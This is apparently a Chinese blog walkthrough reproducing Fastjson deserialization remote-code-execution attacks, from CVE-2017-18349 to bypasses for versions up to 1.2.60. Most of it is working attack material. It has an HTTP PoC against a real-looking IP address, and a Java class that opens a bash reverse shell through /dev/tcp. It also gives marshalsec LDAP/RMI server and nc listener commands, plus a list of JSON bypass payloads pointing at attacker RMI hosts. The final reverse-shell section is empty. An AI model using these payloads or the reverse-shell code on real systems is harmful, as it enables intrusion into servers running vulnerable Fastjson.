## Fastjson反序列化复现过程

#### 00x01 先从CVE-2017-18349说起

##### 影响版本
fastjson <= 1.2.24
##### 漏洞原理
fastjson是一个非常流行的库，可以将数据在JSON和Java Object之间互相转换。fastjson在解析json的过程中，支持使用autoType来实例化某一个具体的类，并通过json来填充其属性值，由此可导致反序列命令执行漏洞。
##### 漏洞利用
通过dnslog进行漏洞验证，这里用Burpsuite自带的，修改dataSourceName为自己的地址，验证POC：

```
POST / HTTP/1.1
Host: 113.108.70.111:50070
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:56.0) Gecko/20100101 Firefox/56.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 109
Connection: keep-alive
Upgrade-Insecure-Requests: 1

{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://qjd16x8vi286vnax4cw5gttsijokc9.burpcollaborator.net/Exploit","autoCommit":true}
```

![](https://ccrraannee.github.io/images/fastjson/1.png)

##### 反弹shell，命令执行
首先在外网服务器开启http服务，这里用Python的SimpleHTTPServer模块
```
python -m SimpleHTTPServer 80
```

使用javac编译Exploit.java为Exploit.class
```
import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.IOException;
import java.util.Hashtable;

public class Exploit{
    public Exploit() {}
 
    static
    {
        try {
            String[] cmds =  new String[]{"bash", "-c", "/bin/bash -i >& /dev/tcp/x.x.x./1234 0>&1"};
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
 
    public static void main(String[] args) {
        Exploit e = new Exploit();
        System.out.println("hello world");
    }
}
```

下载marshalsec一键启动rmi或者ldap服务

[https://github.com/mbechler/marshalsec](https://github.com/mbechler/marshalsec)

将Exploit.class放到和marshalsec同目录下，执行命令启动LDAP服务，也可以改为RMI，x.x.x.x为外网服务器ip，80端口为http服务启动端口。表示获取http://x.x.x.x:80/#Exploit.class内容作为payload，服务监听在1389端口。
```
java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://x.x.x.x:80/#Exploit 1389
```

在该服务器启动一个nc监听
```
nc -lvp 1234
```

最后发送POC：

![](https://ccrraannee.github.io/images/fastjson/4.png)

首先会在http服务端产生请求

![](https://ccrraannee.github.io/images/fastjson/2.png)

然后会在1389端口产生发送playlod信息

![](https://ccrraannee.github.io/images/fastjson/3.png)

最后会反弹shell

![](https://ccrraannee.github.io/images/fastjson/5.png)


#### 00x02 CVE-2017-18349后多种绕过方式


##### 各版本对应POC
1.适用于1.2.25-1.2.30、1.2.41(需开启autotype)
```
{"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"rmi://xxx.com/Exploit", "autoCommit":true}
```
2.适用于1.2.25-1.2.30、1.2.41、1.2.42(需开启autotype)
```
{"@type":"LLcom.sun.rowset.JdbcRowSetImpl;;","dataSourceName":"rmi://xxx.com/Exploit", "autoCommit":true}
```
3.适用于1.2.41、1.2.42、1.2.43(需开启autotype)
```
{"@type":"[com.sun.rowset.JdbcRowSetImpl"[{"dataSourceName":"rmi://xxx.com/Exploit","autoCommit":true]}
```
4.适用于1.2.45(需开启autotype)-ibatis绕过方式
```
{"@type":"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory","properties":{"data_source":"rmi://xxx.com/Exploit"}}
```
5.适用于<=1.2.47(不需开启autotype)-黑名单绕过方式
```
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://xxx/Exploit","autoCommit":true}}}
```


> 参考链接

[浅谈Fastjson RCE漏洞的绕过史](https://www.freebuf.com/vuls/208339.html)


#### 00x03 1.2.60版本利用方式

##### 靶场环境
使用Spring Boot加载fastjson 1.2.60 （开启AutoType）

jdk 1.8.0_112
##### 附加组件
commons-configuration-1.4.jar（poc1用到的库），
commons-lang-2.6.jar（依赖库），
commons-collections-3.2.1.jar（依赖库）

ojdbc14-10.2.0.2.0.jar（poc2用到的库），
javax.resource-api-1.7.1.jar（依赖库）

##### POC
1.适用于<=1.2.60（需开启AutoType）
```
{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://x.x.x.x:1389/Exploit"}
```
2.适用于<=1.2.60（需开启AutoType）
```
{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://x.x.x.x:1111/Exploit"}
```

3.根据1.2.47版本POC的构造方法，结合最新利用方式可以得出下列<=1.2.47多种绕过方法，均无需开启AutoType。
```
{"a":{"@type":"java.lang.Class","val":"org.apache.commons.configuration.JNDIConfiguration"},"b":{"@type":"org.apache.commons.configuration.JNDIConfiguration","prefix":"rmi://xxx/Exploit"}}
```
```
{"a":{"@type":"java.lang.Class","val":"oracle.jdbc.connector.OracleManagedConnectionFactory"},"b":{"@type":"oracle.jdbc.connector.OracleManagedConnectionFactory","xaDataSourceName":"rmi://xxx/Exploit"}}
```

##### 漏洞验证

![](https://ccrraannee.github.io/images/fastjson/6.png)

##### 反弹shell

